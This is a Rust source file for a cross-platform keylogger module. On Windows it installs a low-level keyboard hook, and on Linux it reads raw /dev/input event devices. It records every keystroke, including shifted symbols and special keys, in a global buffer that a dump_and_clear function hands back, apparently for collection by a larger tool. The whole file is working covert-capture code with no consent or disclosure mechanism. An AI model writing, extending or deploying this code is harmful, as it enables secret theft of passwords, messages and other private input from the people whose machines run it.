use std::sync::Mutex;
use std::sync::atomic::{AtomicBool, Ordering};

static RUNNING: AtomicBool = AtomicBool::new(false);
static KEYBUF: Mutex<String> = Mutex::new(String::new());

pub fn start() {
    if RUNNING.swap(true, Ordering::SeqCst) {
        return;
    }
    *KEYBUF.lock().unwrap() = String::new();

    std::thread::spawn(move || {
        #[cfg(target_os = "windows")]
        keylogger_thread_windows();
        #[cfg(target_os = "linux")]
        keylogger_thread_linux();
    });
}

pub fn stop() {
    RUNNING.store(false, Ordering::SeqCst);
    #[cfg(target_os = "windows")]
    unsafe {
        let tid = THREAD_ID.load(Ordering::SeqCst);
        if tid != 0 {
            winapi::um::winuser::PostThreadMessageA(tid, winapi::um::winuser::WM_QUIT, 0, 0);
        }
    }
}

pub fn dump_and_clear() -> String {
    let mut buf = KEYBUF.lock().unwrap();
    std::mem::take(&mut *buf)
}

pub fn is_running() -> bool {
    RUNNING.load(Ordering::SeqCst)
}

fn append(s: &str) {
    if let Ok(mut buf) = KEYBUF.lock() {
        buf.push_str(s);
    }
}

fn append_char(c: char) {
    if let Ok(mut buf) = KEYBUF.lock() {
        buf.push(c);
    }
}

// ── Windows: SetWindowsHookExA WH_KEYBOARD_LL ──

#[cfg(target_os = "windows")]
use std::sync::atomic::AtomicU32;

#[cfg(target_os = "windows")]
static THREAD_ID: AtomicU32 = AtomicU32::new(0);

#[cfg(target_os = "windows")]
fn keylogger_thread_windows() {
    use winapi::um::libloaderapi::GetModuleHandleA;
    use winapi::um::processthreadsapi::GetCurrentThreadId;
    use winapi::um::winuser::*;

    unsafe {
        let hmod = GetModuleHandleA(std::ptr::null_mut());
        THREAD_ID.store(GetCurrentThreadId(), Ordering::SeqCst);

        let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(hook_callback), hmod, 0);

        if hook.is_null() {
            RUNNING.store(false, Ordering::SeqCst);
            return;
        }

        let mut msg = std::mem::zeroed::<MSG>();
        while GetMessageA(&mut msg, std::ptr::null_mut(), 0, 0) != 0 {
            TranslateMessage(&mut msg);
            DispatchMessageA(&mut msg);
        }

        UnhookWindowsHookEx(hook);
        RUNNING.store(false, Ordering::SeqCst);
    }
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn hook_callback(
    code: i32,
    wparam: winapi::shared::minwindef::WPARAM,
    lparam: winapi::shared::minwindef::LPARAM,
) -> winapi::shared::minwindef::LRESULT {
    use winapi::um::winuser::*;

    if code >= 0 && RUNNING.load(Ordering::SeqCst) {
        if wparam as u32 == WM_KEYDOWN || wparam as u32 == WM_SYSKEYDOWN {
            let kb = unsafe { *(lparam as *const KBDLLHOOKSTRUCT) };
            unsafe { handle_key_windows(kb.vkCode as u32); }
        }
    }
    unsafe { CallNextHookEx(std::ptr::null_mut(), code, wparam, lparam) }
}

#[cfg(target_os = "windows")]
unsafe fn handle_key_windows(vk: u32) {
    use winapi::um::winuser::*;

    let shift = unsafe { GetAsyncKeyState(VK_SHIFT) & -32768i16 != 0 };
    let caps = unsafe { GetKeyState(VK_CAPITAL) & 0x01 != 0 };

    match vk {
        0x41..=0x5A => {
            let off = (vk - 0x41) as u8;
            let c = if shift ^ caps {
                (b'A' + off) as char
            } else {
                (b'a' + off) as char
            };
            append_char(c);
        }
        0x30..=0x39 => {
            let idx = (vk - 0x30) as usize;
            let c = if shift {
                [')', '!', '@', '#', '$', '%', '^', '&', '*', '('][idx]
            } else {
                ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'][idx]
            };
            append_char(c);
        }
        0x20 => append_char(' '),
        0x0D => append_char('\n'),
        0x09 => append_char('\t'),
        0x08 => append("[BS]"),
        0x2E => append("[DEL]"),
        0x1B => append("[ESC]"),
        0x25 => append("[LEFT]"),
        0x27 => append("[RIGHT]"),
        0x26 => append("[UP]"),
        0x28 => append("[DOWN]"),
        0x24 => append("[HOME]"),
        0x23 => append("[END]"),
        0x21 => append("[PGUP]"),
        0x22 => append("[PGDN]"),
        0x5B => append("[WIN]"),
        0x5C => append("[RWIN]"),
        0x10 | 0x11 | 0x12 | 0x14 | 0xA0 | 0xA1 | 0xA2 | 0xA3 | 0xA4 | 0xA5 => {}
        0xBA => append(if shift { ":" } else { ";" }),
        0xBB => append(if shift { "+" } else { "=" }),
        0xBC => append(if shift { "<" } else { "," }),
        0xBD => append(if shift { "_" } else { "-" }),
        0xBE => append(if shift { ">" } else { "." }),
        0xBF => append(if shift { "?" } else { "/" }),
        0xC0 => append(if shift { "~" } else { "`" }),
        0xDB => append(if shift { "{" } else { "[" }),
        0xDC => append(if shift { "|" } else { "\\" }),
        0xDD => append(if shift { "}" } else { "]" }),
        0xDE => append(if shift { "\"" } else { "'" }),
        0x70 => append("[F1]"),
        0x71 => append("[F2]"),
        0x72 => append("[F3]"),
        0x73 => append("[F4]"),
        0x74 => append("[F5]"),
        0x75 => append("[F6]"),
        0x76 => append("[F7]"),
        0x77 => append("[F8]"),
        0x78 => append("[F9]"),
        0x79 => append("[F10]"),
        0x7A => append("[F11]"),
        0x7B => append("[F12]"),
        _ => {}
    }
}

// ── Linux: /dev/input/event* ──

#[cfg(target_os = "linux")]
fn keylogger_thread_linux() {
    use std::fs::{self, File};
    use std::io::Read;
    use std::os::unix::io::AsRawFd;

    fn find_keyboards() -> Vec<String> {
        let mut devices = Vec::new();
        if let Ok(entries) = fs::read_dir("/dev/input/by-path") {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.contains("-kbd") || name.contains("-event-kbd") {
                    if let Ok(path) = fs::canonicalize(entry.path()) {
                        devices.push(path.to_string_lossy().to_string());
                    }
                }
            }
        }
        if devices.is_empty() {
            if let Ok(entries) = fs::read_dir("/dev/input") {
                for entry in entries.flatten() {
                    let name = entry.file_name().to_string_lossy().to_string();
                    if name.starts_with("event") {
                        devices.push(entry.path().to_string_lossy().to_string());
                    }
                }
            }
        }
        devices
    }

    let devices = find_keyboards();
    if devices.is_empty() {
        RUNNING.store(false, Ordering::SeqCst);
        return;
    }

    let mut files: Vec<File> = Vec::new();
    for dev in &devices {
        if let Ok(f) = File::open(dev) {
            let fd = f.as_raw_fd();
            unsafe {
                let flags = libc::fcntl(fd, libc::F_GETFL, 0);
                libc::fcntl(fd, libc::F_SETFL, flags | libc::O_NONBLOCK);
            }
            files.push(f);
        }
    }

    if files.is_empty() {
        RUNNING.store(false, Ordering::SeqCst);
        return;
    }

    let mut buf = [0u8; 24];
    while RUNNING.load(Ordering::SeqCst) {
        for f in &files {
            loop {
                match f.read(&mut buf) {
                    Ok(24) => {
                        let type_ = u16::from_ne_bytes([buf[16], buf[17]]);
                        let code = u16::from_ne_bytes([buf[18], buf[19]]);
                        let value = u32::from_ne_bytes([buf[20], buf[21], buf[22], buf[23]]);
                        if type_ == 1 && value == 1 {
                            handle_key_linux(code);
                        }
                    }
                    Ok(_) => continue,
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => break,
                    Err(_) => break,
                }
            }
        }
        std::thread::sleep(std::time::Duration::from_millis(10));
    }
}

#[cfg(target_os = "linux")]
fn handle_key_linux(code: u16) {
    match code {
        1 => append("[ESC]"),
        2 => append_char('1'),
        3 => append_char('2'),
        4 => append_char('3'),
        5 => append_char('4'),
        6 => append_char('5'),
        7 => append_char('6'),
        8 => append_char('7'),
        9 => append_char('8'),
        10 => append_char('9'),
        11 => append_char('0'),
        12 => append_char('-'),
        13 => append_char('='),
        14 => append("[BS]"),
        15 => append_char('\t'),
        16 => append_char('q'),
        17 => append_char('w'),
        18 => append_char('e'),
        19 => append_char('r'),
        20 => append_char('t'),
        21 => append_char('y'),
        22 => append_char('u'),
        23 => append_char('i'),
        24 => append_char('o'),
        25 => append_char('p'),
        26 => append_char('['),
        27 => append_char(']'),
        28 => append_char('\n'),
        30 => append_char('a'),
        31 => append_char('s'),
        32 => append_char('d'),
        33 => append_char('f'),
        34 => append_char('g'),
        35 => append_char('h'),
        36 => append_char('j'),
        37 => append_char('k'),
        38 => append_char('l'),
        39 => append_char(';'),
        40 => append_char('\''),
        41 => append_char('`'),
        43 => append_char('\\'),
        44 => append_char('z'),
        45 => append_char('x'),
        46 => append_char('c'),
        47 => append_char('v'),
        48 => append_char('b'),
        49 => append_char('n'),
        50 => append_char('m'),
        51 => append_char(','),
        52 => append_char('.'),
        53 => append_char('/'),
        55 => append_char('*'),
        57 => append_char(' '),
        58 => append("[CAPS]"),
        59 => append("[F1]"),
        60 => append("[F2]"),
        61 => append("[F3]"),
        62 => append("[F4]"),
        63 => append("[F5]"),
        64 => append("[F6]"),
        65 => append("[F7]"),
        66 => append("[F8]"),
        67 => append("[F9]"),
        68 => append("[F10]"),
        69 => append("[NUMLK]"),
        70 => append("[SCRLK]"),
        71 => append("[HOME]"),
        72 => append("[UP]"),
        73 => append("[PGUP]"),
        75 => append("[LEFT]"),
        77 => append("[RIGHT]"),
        79 => append("[END]"),
        80 => append("[DOWN]"),
        81 => append("[PGDN]"),
        82 => append("[INS]"),
        83 => append("[DEL]"),
        87 => append("[F11]"),
        88 => append("[F12]"),
        96 => append_char('\n'),
        110 => append("[INS]"),
        111 => append("[DEL]"),
        119 => append("[PAUSE]"),
        125 => append("[WIN]"),
        _ => {}
    }
}
